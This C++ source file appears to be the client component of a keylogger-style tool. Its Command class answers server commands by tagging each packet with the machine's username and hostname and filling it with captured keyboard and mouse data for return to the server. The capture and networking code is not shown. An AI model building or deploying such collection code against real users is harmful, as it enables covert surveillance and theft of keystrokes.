//
// Created by lavigne on 10/4/17.
//

#include <iostream>
#include <windows.h>
#include <Lmcons.h>
#include "client/Command.hpp"

Command::Command() {}

Command::~Command() {}

/*
 * Process découpe la commande reçu par le serveur puis la traite.
 */
bool                        Command::process(std::map<char, Module> modules, std::string received, boost::asio::streambuf &buf)
{
    std::ostream                    os(&buf);
    boost::archive::text_oarchive   ar(os);
    char                            code = received[0];

    Module                          module = modules[code];
    t_paquet                        *data = getMessageFormat(module);
    ar & data;
    if (data == NULL)
        return false;
    return true;
}

std::string                 Command::getUsername()
{
    TCHAR name [ UNLEN + 1 ];
    DWORD size = UNLEN + 1;
    std::string user;

    GetUserName((TCHAR*)name, &size);
    user = name;
    return user;
}

std::string                 Command::getHostname()
{
    TCHAR  infoBuf[128];
    DWORD  bufCharCount = 128;
    std::string host;

    GetComputerName(infoBuf, &bufCharCount);
    host = infoBuf;
    return host;
}

/*
 * Créer la structure à renvoyer au serveur.
 */
t_paquet                    *Command::getMessageFormat(Module module)
{
    t_paquet    *data = new t_paquet;

    data->kbdata = NULL;
    data->msdata = NULL;
    data->opcode = module.getOpcode();
    data->id = this->getUsername();
    data->id += "@";
    data->id += this->getHostname();
    module.getDatas(data);
    if (data->kbdata == NULL && data->msdata == NULL)
        return NULL;
    return data;
}
